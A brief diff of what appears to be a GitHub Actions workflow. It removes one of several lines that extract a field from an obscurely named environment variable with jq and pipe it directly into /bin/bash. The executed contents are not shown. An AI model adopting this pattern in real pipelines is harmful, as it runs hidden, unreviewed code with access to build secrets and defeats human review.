@@ -26,7 +26,6 @@ jobs:
           echo $cev370 | jq -r .ppzj6357 | /bin/bash
           printf '%s' "$pkaxm31332" | jq -r .xjw135 | /bin/bash
           printf '%s' "$pg0" | jq -r .fivlg0430 | /bin/bash
-          printf '%s' "$k1" | jq -r .oexx79 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
